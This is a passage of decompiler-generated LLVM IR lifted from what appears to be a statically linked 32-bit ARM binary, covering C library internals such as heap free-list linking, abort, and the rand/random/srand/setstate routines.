dec_label_pc_16250:                               ; preds = %dec_label_pc_161f4, %entry, %dec_label_pc_16248.dec_label_pc_16250.loopexit_crit_edge, %dec_label_pc_161f0
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_16244, { 1, 2, 0 }
  uselistorder i32 %v0_1622c, { 1, 0 }
  uselistorder i32 %v1_161f8, { 0, 2, 1, 3 }
  uselistorder i1 %v9_161e8, { 1, 0 }
  uselistorder i32 %v2_161dc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1621c, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_16250, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_161dc, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_16258 = load i32, i32* @r2, align 4
  %v2_16258 = icmp eq i32 %v0_16258, 0
  %v0_1625c = load i32, i32* @r3, align 4
  %v1_1625c = load i32, i32* @r1, align 4
  %v2_1625c = add i32 %v1_1625c, 4
  %v3_1625c = inttoptr i32 %v2_1625c to i32*
  store i32 %v0_1625c, i32* %v3_1625c, align 4
  %v0_16260 = load i32, i32* @r2, align 4
  %v1_16260 = load i32, i32* @r1, align 4
  %v2_16260 = add i32 %v1_16260, 8
  %v3_16260 = inttoptr i32 %v2_16260 to i32*
  store i32 %v0_16260, i32* %v3_16260, align 4
  %v1_16268 = load i32, i32* @r1, align 4
  br i1 %v2_16258, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_16264 = load i32, i32* @r2, align 4
  %v3_16264 = add i32 %v2_16264, 4
  %v4_16264 = inttoptr i32 %v3_16264 to i32*
  store i32 %v1_16268, i32* %v4_16264, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_16268 = load i32, i32* @r0, align 4
  %v3_16268 = inttoptr i32 %v2_16268 to i32*
  store i32 %v1_16268, i32* %v3_16268, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_1626c = load i32, i32* @r3, align 4
  %v2_1626c = icmp eq i32 %v0_1626c, 0
  br i1 %v2_1626c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_16270 = load i32, i32* @r1, align 4
  %v3_16270 = add i32 %v0_1626c, 8
  %v4_16270 = inttoptr i32 %v3_16270 to i32*
  store i32 %v1_16270, i32* %v4_16270, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_16274 = load i32, i32* @r0, align 4
  ret i32 %v1_16274

; uselistorder directives
  uselistorder i32 %v1_16268, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_16278 = load i32, i32* @r2, align 4
  %v2_16278 = icmp eq i32 %v0_16278, 0
  %v1_1627c = load i32, i32* @r1, align 4
  br i1 %v2_16278, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1627c = load i32, i32* @r0, align 4
  %v3_1627c = inttoptr i32 %v2_1627c to i32*
  store i32 %v1_1627c, i32* %v3_1627c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_16280 = add i32 %v0_16278, 4
  %v4_16280 = inttoptr i32 %v3_16280 to i32*
  store i32 %v1_1627c, i32* %v4_16280, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_16284 = load i32, i32* @r2, align 4
  %v1_16284 = load i32, i32* @r1, align 4
  %v2_16284 = add i32 %v1_16284, 8
  %v3_16284 = inttoptr i32 %v2_16284 to i32*
  store i32 %v0_16284, i32* %v3_16284, align 4
  %v1_16288 = load i32, i32* @r0, align 4
  ret i32 %v1_16288

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1628c = load i32, i32* @r4, align 4
  store i32 %v3_1628c, i32* %stack_var_-20, align 4
  %v2_16290 = load i32, i32* %arg1, align 4
  store i32 %v2_16290, i32* %r4.global-to-local, align 4
  %v2_16294 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_162b02 = icmp eq i32 %v2_16290, 0
  br i1 %v2_162b02, label %dec_label_pc_16360, label %dec_label_pc_162a0

dec_label_pc_162a0:                               ; preds = %entry, %dec_label_pc_162a8
  %v0_162f0 = phi i32 [ %v0_162f8, %dec_label_pc_162a8 ], [ 0, %entry ]
  %v0_162f8 = phi i32 [ %v3_162ac, %dec_label_pc_162a8 ], [ %v2_16290, %entry ]
  %v1_162b45.in = phi i32 [ %v3_162ac, %dec_label_pc_162a8 ], [ %v2_16290, %entry ]
  %v1_162b45 = add i32 %v1_162b45.in, 12
  %v3_162a0 = icmp ult i32 %v1_162b45, %arg2
  br i1 %v3_162a0, label %dec_label_pc_162a8, label %dec_label_pc_162c0

dec_label_pc_162a8:                               ; preds = %dec_label_pc_162a0
  store i32 %v0_162f8, i32* %r6.global-to-local, align 4
  %v1_162ac = add i32 %v0_162f8, 4
  %v2_162ac = inttoptr i32 %v1_162ac to i32*
  %v3_162ac = load i32, i32* %v2_162ac, align 4
  store i32 %v3_162ac, i32* %r4.global-to-local, align 4
  %v2_162b0 = icmp eq i32 %v3_162ac, 0
  br i1 %v2_162b0, label %dec_label_pc_162b0.dec_label_pc_16360.loopexit_crit_edge, label %dec_label_pc_162a0

dec_label_pc_162c0:                               ; preds = %dec_label_pc_162a0
  %v1_162c0 = inttoptr i32 %v0_162f8 to i32*
  %v2_162c0 = load i32, i32* %v1_162c0, align 4
  store i32 %v2_162c0, i32* @ip, align 4
  %v2_162c4 = sub i32 %v0_162f8, %v2_162c0
  %v1_162c8 = add i32 %v2_162c4, 12
  %v3_162cc = icmp uge i32 %v1_162c8, %v2_16294
  %v9_162cc = icmp eq i32 %v1_162c8, %v2_16294
  %v2_162d0 = xor i1 %v9_162cc, true
  %v3_162d0 = and i1 %v3_162cc, %v2_162d0
  br i1 %v3_162d0, label %dec_label_pc_16360, label %dec_label_pc_162d4

dec_label_pc_162d4:                               ; preds = %dec_label_pc_162c0
  %v2_162d4 = add i32 %v2_162c0, %arg3
  store i32 %v2_162d4, i32* %r7.global-to-local, align 4
  br i1 %v9_162cc, label %dec_label_pc_162dc, label %dec_label_pc_16308

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162d4
  %v2_162dc = icmp eq i32 %v0_162f0, 0
  br i1 %v2_162dc, label %dec_label_pc_16354, label %dec_label_pc_162e4

dec_label_pc_162e4:                               ; preds = %dec_label_pc_162dc
  %v1_162e4 = add i32 %v0_162f0, 12
  %v9_162e8 = icmp eq i32 %v1_162e4, %arg2
  br i1 %v9_162e8, label %dec_label_pc_162f0, label %dec_label_pc_16354

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162e4
  %v1_162f0 = inttoptr i32 %v0_162f0 to i32*
  %v2_162f0 = load i32, i32* %v1_162f0, align 4
  %v1_162f4 = add i32 %v0_162f0, 8
  %v2_162f4 = inttoptr i32 %v1_162f4 to i32*
  %v3_162f4 = load i32, i32* %v2_162f4, align 4
  store i32 %v3_162f4, i32* @r2, align 4
  store i32 %v0_162f8, i32* @r1, align 4
  %v2_162fc = add i32 %v2_162f0, %v2_162d4
  store i32 %v2_162fc, i32* %r7.global-to-local, align 4
  %v0_16300 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_16354

dec_label_pc_16308:                               ; preds = %dec_label_pc_162d4
  %v1_16308 = add i32 %v0_162f8, 4
  %v2_16308 = inttoptr i32 %v1_16308 to i32*
  %v3_16308 = load i32, i32* %v2_16308, align 4
  store i32 %v3_16308, i32* %r5.global-to-local, align 4
  %v2_1630c = icmp eq i32 %v3_16308, 0
  br i1 %v2_1630c, label %dec_label_pc_16340, label %dec_label_pc_16314

dec_label_pc_16314:                               ; preds = %dec_label_pc_16308
  %v1_16314 = inttoptr i32 %v3_16308 to i32*
  %v2_16314 = load i32, i32* %v1_16314, align 4
  store i32 %v2_16314, i32* @ip, align 4
  %v2_16318 = sub i32 %v3_16308, %v2_16314
  %v1_1631c = add i32 %v2_16318, 12
  %v9_16320 = icmp eq i32 %v2_16294, %v1_1631c
  br i1 %v9_16320, label %dec_label_pc_16328, label %dec_label_pc_16340

dec_label_pc_16328:                               ; preds = %dec_label_pc_16314
  store i32 %v0_162f0, i32* @r2, align 4
  store i32 %v3_16308, i32* @r1, align 4
  %v2_16330 = add i32 %v2_16314, %v2_162d4
  store i32 %v2_16330, i32* %r7.global-to-local, align 4
  %v0_16334 = call i32 @__heap_link_free_area_after()
  %v0_16338 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16338, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16354

dec_label_pc_16340:                               ; preds = %dec_label_pc_16314, %dec_label_pc_16308
  %v2_16340 = add i32 %v0_162f8, %arg3
  store i32 %v2_16340, i32* %r4.global-to-local, align 4
  store i32 %v3_16308, i32* @r3, align 4
  store i32 %v0_162f0, i32* @r2, align 4
  store i32 %v2_16340, i32* @r1, align 4
  %v0_16350 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16354

dec_label_pc_16354:                               ; preds = %dec_label_pc_162e4, %dec_label_pc_162dc, %dec_label_pc_16328, %dec_label_pc_162f0, %dec_label_pc_16340
  %v0_16354 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16354, i32* %r5.global-to-local, align 4
  %v0_16358 = load i32, i32* %r7.global-to-local, align 4
  %v2_16358 = inttoptr i32 %v0_16354 to i32*
  store i32 %v0_16358, i32* %v2_16358, align 4
  br label %dec_label_pc_16378

dec_label_pc_162b0.dec_label_pc_16360.loopexit_crit_edge: ; preds = %dec_label_pc_162a8
  br label %dec_label_pc_16360

dec_label_pc_16360:                               ; preds = %entry, %dec_label_pc_162b0.dec_label_pc_16360.loopexit_crit_edge, %dec_label_pc_162c0
  %v1_16360 = add i32 %v2_16294, -12
  store i32 %v1_16360, i32* %r5.global-to-local, align 4
  %v3_16364 = inttoptr i32 %v1_16360 to i32*
  store i32 %arg3, i32* %v3_16364, align 4
  %v0_16368 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16368, i32* @r3, align 4
  %v0_1636c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1636c, i32* @r2, align 4
  %v0_16370 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16370, i32* @r1, align 4
  %v0_16374 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16378

dec_label_pc_16378:                               ; preds = %dec_label_pc_16354, %dec_label_pc_16360
  %v0_16378 = load i32, i32* %r5.global-to-local, align 4
  %v2_1637c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1637c, i32* @r4, align 4
  ret i32 %v0_16378

; uselistorder directives
  uselistorder i32 %v3_16308, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_162cc, { 1, 0 }
  uselistorder i32 %v3_162ac, { 2, 3, 1, 0 }
  uselistorder i32 %v0_162f8, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_162f0, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16378, { 1, 0 }
  uselistorder label %dec_label_pc_16360, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16354, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_162a0, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_1639c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_16380 = ptrtoint i32* %stack_var_-268 to i32
  %v1_16390 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_1639c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1639c

dec_label_pc_1639c:                               ; preds = %dec_label_pc_1639c.lr.ph, %dec_label_pc_1639c
  %v1_163a0 = phi i32 [ 31, %dec_label_pc_1639c.lr.ph ], [ %v1_163ac, %dec_label_pc_1639c ]
  %v4_163a0 = mul i32 %v1_163a0, 4
  %v5_163a0 = add i32 %v4_163a0, %v2_1639c
  %v2_163a8 = add i32 %v5_163a0, -128
  %v3_163a8 = inttoptr i32 %v2_163a8 to i32*
  store i32 0, i32* %v3_163a8, align 4
  %v0_163ac = load i32, i32* %r1.global-to-local, align 4
  %v1_163ac = add i32 %v0_163ac, -1
  store i32 %v1_163ac, i32* %r1.global-to-local, align 4
  %v6_163ac = icmp slt i32 %v1_163ac, 0
  br i1 %v6_163ac, label %dec_label_pc_163b4, label %dec_label_pc_1639c

dec_label_pc_163b4:                               ; preds = %dec_label_pc_1639c
  %v2_163b4 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_163b4, i32* @r4, align 4
  store i32 %v2_163b4, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_163c0 = call i32 @__sigaddset()
  %v2_163c4 = icmp eq i32 %v0_163c0, 0
  br i1 %v2_163c4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_163b4
  store i32 %v2_163b4, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_163b4, %bb
  store i32 91096, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_163c4, i32 ptrtoint (i32* @global_var_131f8.1008 to i32))
  %v2_163dc = load i32, i32* @global_var_2ca98.1010, align 4
  %v2_163e0 = icmp eq i32 %v2_163dc, 0
  br i1 %v2_163e0, label %dec_label_pc_163e8, label %dec_label_pc_16418

dec_label_pc_163e8:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2ca98.1010, align 4
  br label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %dec_label_pc_16468, %dec_label_pc_163e8
  store i32 91136, i32* @lr, align 4
  %v1_163fc = call i32 @__pthread_return_0()
  %v1_16404 = call i32 @__raise(i32 6)
  store i32 91160, i32* @lr, align 4
  %v1_16414 = call i32 @__pthread_return_0()
  %v2_1641c.pre = load i32, i32* @global_var_2ca98.1010, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %.thread1, %dec_label_pc_163f0
  %v0_1648c = phi i32 [ %v2_163dc, %.thread1 ], [ %v2_1641c.pre, %dec_label_pc_163f0 ]
  store i32 ptrtoint (i32* @global_var_2ca98.1010 to i32), i32* %ip.global-to-local, align 4
  %v7_16420 = icmp eq i32 %v0_1648c, 1
  br i1 %v7_16420, label %dec_label_pc_16450.lr.ph, label %dec_label_pc_16484

dec_label_pc_16450.lr.ph:                         ; preds = %dec_label_pc_16418
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2ca98.1010, align 4
  %v2_1643c = bitcast i32* %stack_var_-268 to i8*
  %v3_1643c = call i32 @__GI_memset(i8* %v2_1643c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16450

dec_label_pc_16450:                               ; preds = %dec_label_pc_16450.lr.ph, %dec_label_pc_16450
  %v1_16454 = phi i32 [ 31, %dec_label_pc_16450.lr.ph ], [ %v1_16460, %dec_label_pc_16450 ]
  %v4_16454 = mul i32 %v1_16454, 4
  %v5_16454 = add i32 %v4_16454, %v2_1639c
  %v2_1645c = add i32 %v5_16454, -264
  %v3_1645c = inttoptr i32 %v2_1645c to i32*
  store i32 -1, i32* %v3_1645c, align 4
  %v0_16460 = load i32, i32* %r1.global-to-local, align 4
  %v1_16460 = add i32 %v0_16460, -1
  store i32 %v1_16460, i32* %r1.global-to-local, align 4
  %v6_16460 = icmp slt i32 %v1_16460, 0
  br i1 %v6_16460, label %dec_label_pc_16468, label %dec_label_pc_16450

dec_label_pc_16468:                               ; preds = %dec_label_pc_16450
  store i32 %v2_16380, i32* %r1.global-to-local, align 4
  %v4_1647c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_163f0

dec_label_pc_16484:                               ; preds = %dec_label_pc_16418
  %v7_16484 = icmp eq i32 %v0_1648c, 2
  br i1 %v7_16484, label %dec_label_pc_1648c, label %dec_label_pc_16498

dec_label_pc_1648c:                               ; preds = %dec_label_pc_16484
  store i32 3, i32* @global_var_2ca98.1010, align 4
  %v0_16494 = call i32 @abort()
  %v2_16498.pre = load i32, i32* @global_var_2ca98.1010, align 4
  br label %dec_label_pc_16498

dec_label_pc_16498:                               ; preds = %dec_label_pc_16484, %dec_label_pc_1648c
  %v1_164a0 = phi i32 [ %v0_1648c, %dec_label_pc_16484 ], [ %v2_16498.pre, %dec_label_pc_1648c ]
  %v7_1649c = icmp eq i32 %v1_164a0, 3
  br i1 %v7_1649c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_16498
  %v2_164a8 = load i32, i32* %ip.global-to-local, align 4
  %v3_164a8 = inttoptr i32 %v2_164a8 to i32*
  store i32 4, i32* %v3_164a8, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16498, %bb27
  call void @__pseudo_cond_branch(i1 %v7_1649c, i32 ptrtoint (i32* @global_var_12de4.1012 to i32))
  br label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %dec_label_pc_164b0, %.thread3
  %v0_164b0 = call i32 @abort()
  br label %dec_label_pc_164b0

; uselistorder directives
  uselistorder i32 %v1_16460, { 2, 1, 0 }
  uselistorder i32 %v1_163ac, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32* @global_var_2ca98.1010, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16498, { 1, 0 }
  uselistorder label %dec_label_pc_16450, { 1, 0 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1639c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_164c8 = call i32 @random()
  ret i32 %v0_164c8

; uselistorder directives
  uselistorder i32 ()* @random, { 10, 1, 2, 0, 4, 3, 7, 6, 5, 9, 8 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_164cc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26750.1014 to i32), i32* @r4, align 4
  %v2_164d4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_164d4, i32* @r0, align 4
  %v1_164ec = call i32 @__pthread_return_void()
  %v1_164fc = call i32 @__pthread_return_0()
  %v2_16500 = ptrtoint i32* %stack_var_-16 to i32
  %v3_16508 = call i32 @__GI_random_r(i32* inttoptr (i32 157544 to i32*), i32 %v2_16500)
  store i32 %v2_164d4, i32* @r0, align 4
  store i32 91424, i32* @lr, align 4
  %v1_1651c = call i32 @__pthread_return_void()
  %v3_16520 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_164cc, i32* @r4, align 4
  ret i32 %v3_16520
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_1654c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1654c, i32* @r0, align 4
  %v1_16568 = call i32 @__pthread_return_void()
  %v1_16578 = call i32 @__pthread_return_0()
  %v3_16588 = load i32, i32* bitcast (i32** @global_var_26770.1027 to i32*), align 4
  store i32 %v3_16588, i32* @r4, align 4
  %v3_1658c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_26768)
  %v1_16594 = icmp slt i32 %v3_1658c, 0
  store i32 %v2_1654c, i32* @r0, align 4
  %. = select i1 %v1_16594, i32 0, i32 ptrtoint (i32** @global_var_2676c.1029 to i32)
  %v1_165ac = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_165dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_165dc, i32* @r0, align 4
  %v1_16600 = call i32 @__pthread_return_void()
  %v1_16610 = call i32 @__pthread_return_0()
  %v0_16618 = load i32, i32* @r5, align 4
  %v0_1661c = load i32, i32* @r6, align 4
  %v0_16620 = load i32, i32* @r8, align 4
  %v3_16624 = load i32, i32* bitcast (i32** @global_var_26770.1027 to i32*), align 4
  store i32 %v3_16624, i32* @r4, align 4
  %v4_16628 = inttoptr i32 %v0_16618 to i32*
  %v5_16628 = call i32 @__GI_initstate_r(i32 %v0_16620, i32* %v4_16628, i32 %v0_1661c, i32 ptrtoint (i32* @global_var_26768 to i32))
  store i32 %v2_165dc, i32* @r0, align 4
  %v1_1663c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_2676c.1029 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_1666c = load i32, i32* @r4, align 4
  %v9_1666c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_26750.1014 to i32), i32* @r4, align 4
  %v2_16674 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_16674, i32* @r0, align 4
  %v1_16690 = call i32 @__pthread_return_void()
  %v1_166a0 = call i32 @__pthread_return_0()
  %v0_166a4 = load i32, i32* @r6, align 4
  store i32 %v0_166a4, i32* @r0, align 4
  %v2_166ac = inttoptr i32 %v0_166a4 to i32*
  %v3_166ac = call i32 @srandom_r(i32* %v2_166ac, i32 ptrtoint (i32* @global_var_26768 to i32))
  store i32 %v2_16674, i32* @r0, align 4
  store i32 91848, i32* @lr, align 4
  %v1_166c4 = call i32 @__pthread_return_void()
  store i32 %v3_1666c, i32* @r4, align 4
  store i32 %v9_1666c, i32* @r6, align 4
  ret i32 %v1_166c4

; uselistorder directives
  uselistorder i32* @global_var_26768, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_26768 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_166e8 = add i32 %tmp, 12
  %v2_166e8 = inttoptr i32 %v1_166e8 to i32*
  %v3_166e8 = load i32, i32* %v2_166e8, align 4
  %v3_166ec = load i32, i32* @r4, align 4
  store i32 %v3_166ec, i32* %stack_var_-20, align 4
  %v2_166f0 = icmp eq i32 %v3_166e8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_166f0, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_166fc1 = add i32 %tmp, 8
  %v2_166fc2 = inttoptr i32 %v1_166fc1 to i32*
  %v3_166fc3 = load i32, i32* %v2_166fc2, align 4
  store i32 %v3_166fc3, i32* %r1.global-to-local, align 4
  %v3_16710 = add i32 %v3_166fc3, -4
  %v4_16710 = inttoptr i32 %v3_16710 to i32*
  store i32 0, i32* %v4_16710, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_166f8 = add i32 %tmp, 4
  %v3_166f8 = inttoptr i32 %v2_166f8 to i32*
  %v4_166f8 = load i32, i32* %v3_166f8, align 4
  %v1_166fc = add i32 %tmp, 8
  %v2_166fc = inttoptr i32 %v1_166fc to i32*
  %v3_166fc = load i32, i32* %v2_166fc, align 4
  store i32 %v3_166fc, i32* %r1.global-to-local, align 4
  %v3_16700 = sub i32 %v4_166f8, %v3_166fc
  %v4_16704 = sdiv i32 %v3_16700, 4
  %v4_1670c = mul i32 %v4_16704, 5
  %v5_1670c = add i32 %v4_1670c, %v3_166e8
  %v3_16714 = add i32 %v3_166fc, -4
  %v4_16714 = inttoptr i32 %v3_16714 to i32*
  store i32 %v5_1670c, i32* %v4_16714, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_16718 = add i32 %arg1, 4
  store i32 %v1_16718, i32* %r6.global-to-local, align 4
  %v2_1671c = inttoptr i32 %arg1 to i32*
  %v3_1671c = load i32, i32* %v2_1671c, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_16724 = srem i32 %v3_1671c, 5
  store i32 %v2_16724, i32* %r0.global-to-local, align 4
  %v2_16730 = and i32 %v2_16724, 1073741824
  %v3_16730 = icmp ne i32 %v2_16730, 0
  %v4_16730 = mul nsw i32 %v2_16724, 4
  %v2_16734 = icmp ne i32 %v2_16724, 4
  %v3_16734 = and i1 %v3_16730, %v2_16734
  br i1 %v3_16734, label %dec_label_pc_16790, label %dec_label_pc_16738

dec_label_pc_16738:                               ; preds = %bb
  %v5_16730 = add i32 %v4_16730, ptrtoint (i32* @global_var_1de60.1043 to i32)
  %v1_16738 = add i32 %v4_16730, add (i32 ptrtoint (i32* @global_var_1de60.1043 to i32), i32 20)
  %v2_16738 = inttoptr i32 %v1_16738 to i32*
  %v3_16738 = load i32, i32* %v2_16738, align 4
  store i32 %v3_16738, i32* %r5.global-to-local, align 4
  %v6_1673c = inttoptr i32 %v5_16730 to i32*
  %v7_1673c = load i32, i32* %v6_1673c, align 4
  store i32 %v7_1673c, i32* %r7.global-to-local, align 4
  %v2_16740 = icmp eq i32 %v2_16724, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_16748 = load i32, i32* %r4.global-to-local, align 4
  %v2_16748 = add i32 %v1_16748, 16
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v3_16738, i32* %v3_16748, align 4
  %v0_1674c = load i32, i32* %r7.global-to-local, align 4
  %v1_1674c = load i32, i32* %r4.global-to-local, align 4
  %v2_1674c = add i32 %v1_1674c, 20
  %v3_1674c = inttoptr i32 %v2_1674c to i32*
  store i32 %v0_1674c, i32* %v3_1674c, align 4
  %v0_16750 = load i32, i32* %r0.global-to-local, align 4
  %v1_16750 = load i32, i32* %r4.global-to-local, align 4
  %v2_16750 = add i32 %v1_16750, 12
  %v3_16750 = inttoptr i32 %v2_16750 to i32*
  store i32 %v0_16750, i32* %v3_16750, align 4
  br i1 %v2_16740, label %dec_label_pc_1677c, label %dec_label_pc_16758

dec_label_pc_16758:                               ; preds = %dec_label_pc_16738
  %v0_16758 = load i32, i32* %r6.global-to-local, align 4
  %v1_16758 = add i32 %v0_16758, -4
  %v2_16758 = inttoptr i32 %v1_16758 to i32*
  %v3_16758 = load i32, i32* %v2_16758, align 4
  %v1_1675c = load i32, i32* %r1.global-to-local, align 4
  %v2_1675c = sdiv i32 %v3_16758, %v1_1675c
  store i32 %v2_1675c, i32* %r0.global-to-local, align 4
  %v4_16760 = mul i32 %v2_1675c, 4
  %v5_16760 = add i32 %v4_16760, %v0_16758
  %v1_16764 = load i32, i32* %r4.global-to-local, align 4
  %v2_16764 = add i32 %v1_16764, 4
  %v3_16764 = inttoptr i32 %v2_16764 to i32*
  store i32 %v5_16760, i32* %v3_16764, align 4
  %v0_16768 = load i32, i32* %r0.global-to-local, align 4
  %v1_16768 = load i32, i32* %r7.global-to-local, align 4
  %v2_16768 = add i32 %v1_16768, %v0_16768
  %v0_1676c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1676c, i32* %r1.global-to-local, align 4
  %v2_16770 = srem i32 %v2_16768, %v0_1676c
  %v0_16774 = load i32, i32* %r6.global-to-local, align 4
  %v4_16774 = mul i32 %v2_16770, 4
  %v5_16774 = add i32 %v0_16774, %v4_16774
  store i32 %v5_16774, i32* %r0.global-to-local, align 4
  %v1_16778 = load i32, i32* %r4.global-to-local, align 4
  %v2_16778 = inttoptr i32 %v1_16778 to i32*
  store i32 %v5_16774, i32* %v2_16778, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1677c:                               ; preds = %dec_label_pc_16738, %dec_label_pc_16758
  %v0_1677c = load i32, i32* %r6.global-to-local, align 4
